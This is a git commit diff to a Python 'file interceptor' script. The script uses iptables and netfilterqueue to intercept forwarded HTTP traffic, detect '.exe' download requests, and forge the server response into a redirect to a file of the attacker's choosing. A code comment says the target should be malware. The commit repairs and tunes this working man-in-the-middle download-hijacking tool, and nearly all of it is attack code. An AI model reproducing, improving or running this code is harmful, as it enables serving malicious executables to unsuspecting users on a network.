2a9df8402d1956a35f6dc60325edf12aa612496c
Hambihambi <134943206+Hambihambi@users.noreply.github.com>
2025-12-02 00:32:00 +0200

    Update file_interceptor.py
    Memory cleanup and minor bugfixes.

--- file_interceptor/file_interceptor.py
+++ file_interceptor/file_interceptor.py
@@ -2,6 +2,7 @@
 import netfilterqueue
 import scapy.all as scapy
 import sys, os, subprocess
+import time
 
 
 def root_check():
@@ -13,11 +14,11 @@ def root_check():
 
 def iptable_insert():
     try:
-        subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
-        subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
+        subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
         '''
         or
-        subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
+        subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
+        subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
         '''
         print("[*] Iptables intercepting rule inserted")
     except Exception as e:
@@ -32,26 +33,48 @@ def iptable_flush():
 
 
 def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
+    global packet_count
+    packet_count += 1
+    TTL = 10
 
+    scapy_packet = scapy.IP(packet.get_payload())
+    
     if scapy_packet.haslayer(scapy.Raw):
+        # Check for HTTP Request
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            if b".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] .exe file download detected")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
+
+                # Store the expected ACK with the current timestamp
+                ack_dict[scapy_packet[scapy.TCP].ack] = time.time()
+
+        # Check for HTTP Response
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
+            current_seq = scapy_packet[scapy.TCP].seq
+
+            if current_seq in ack_dict:
+                del ack_dict[current_seq]
                 print("[+] Replacing file")
+
                 #Forge the Response
                 #Change this location to malware. I mean your selected file..
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https:/198.162.1.50/Path/to/file.exe"
+                modified_load = b"HTTP/1.1 301 Moved Permanently\nLocation: https://192.168.1.50/Path/to/file.exe\r\n\r\n"
+                scapy_packet[scapy.Raw].load = modified_load
                 # Remove checksums so Scapy recalculates them
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].len
                 del scapy_packet[scapy.TCP].chksum
+                # Set the modified payload back to the netfilter packet
                 packet.set_payload(bytes(scapy_packet))
+
+    #Memory cleanup after every 500 packet
+    if packet_count % 500 == 0:
+        current_time = time.time()
+        #Awsome list comprehension
+        expired_keys = [k for k, v in ack_dict.items() if current_time - v > 10]
+        for k in expired_keys:
+            del ack_dict[k] 
 
     packet.accept()
 
@@ -63,7 +86,8 @@ if __name__ == "__main__":
     # create the object, bind to the iptables command and run
     queue = netfilterqueue.NetfilterQueue()
     
-    ack_list = []
+    ack_dict = {}
+    packet_count = 0
 
     try:
         queue.bind(1337, process_packet)
